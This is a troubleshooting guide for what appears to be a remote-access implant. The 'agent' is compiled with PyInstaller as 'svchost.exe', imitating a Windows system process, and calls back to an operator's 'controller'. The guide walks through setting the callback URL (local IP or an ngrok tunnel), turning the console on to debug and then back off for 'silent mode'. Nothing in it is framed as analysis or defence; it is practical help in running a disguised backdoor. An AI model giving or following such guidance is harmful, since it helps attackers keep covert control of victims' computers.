# 🚨 QUICK FIX: Agent Not Connecting to Controller

## Problem
Agent is connecting to the **WRONG SERVER**!

**Current setting (Line 186 in client.py):**
```python
FIXED_SERVER_URL = 'https://agent-controller-backend.onrender.com'  # ❌ NOT YOUR CONTROLLER!
```

---

## ✅ Solution (3 Steps)

### Step 1: Edit client.py (Line 186)

**Replace with YOUR controller URL:**

```python
# BEFORE:
FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com')

# AFTER (use YOUR controller URL):
FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'http://YOUR-IP:5000')
```

**Examples:**
```python
# Local (same PC):
FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'http://127.0.0.1:5000')

# Local network:
FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'http://192.168.1.100:5000')

# Internet (ngrok):
FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://abc123.ngrok.io')
```

### Step 2: Enable Console (for debugging)

Edit `svchost.spec` line 71:

```python
# BEFORE:
console=False,  # NO CONSOLE WINDOW

# AFTER (to see what's happening):
console=True,  # SHOW CONSOLE - SEE ERRORS!
```

### Step 3: Recompile & Test

```bash
# Recompile
pyinstaller svchost.spec

# Run and watch output
cd dist
svchost.exe
```

**Look for this in the console:**
```
[OK] Connected to server successfully!  ← SUCCESS!
```

---

## 🎯 Once It Works

1. **Switch back to silent mode:**
   - Edit `svchost.spec` line 71: `console=False`
   - Recompile: `pyinstaller svchost.spec`

2. **Your agent will now connect to YOUR controller!** ✅

---

## 🔍 How to Find YOUR Controller URL

### If controller is on the SAME PC:
```
http://127.0.0.1:5000
```

### If controller is on DIFFERENT PC (same network):
```cmd
# On controller PC, find IP:
ipconfig

# Look for "IPv4 Address", e.g., 192.168.1.100
# Then use:
http://192.168.1.100:5000
```

### If controller is on INTERNET (ngrok, etc.):
```
Use the public URL ngrok gives you
Example: https://abc123.ngrok.io
```

---

## ⚡ Super Quick Fix (Copy-Paste)

**1. Open client.py, find line 186, replace with:**
```python
FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'http://127.0.0.1:5000')  # ← Change this IP!
```

**2. Open svchost.spec, find line 71, change to:**
```python
console=True,  # ← Change to True for debugging
```

**3. Run:**
```bash
pyinstaller svchost.spec
cd dist
svchost.exe
```

**4. Watch console - should say "Connected to server successfully!" ✅**

---

That's it! The problem is just the wrong server URL. Fix it, recompile, done! 🎉
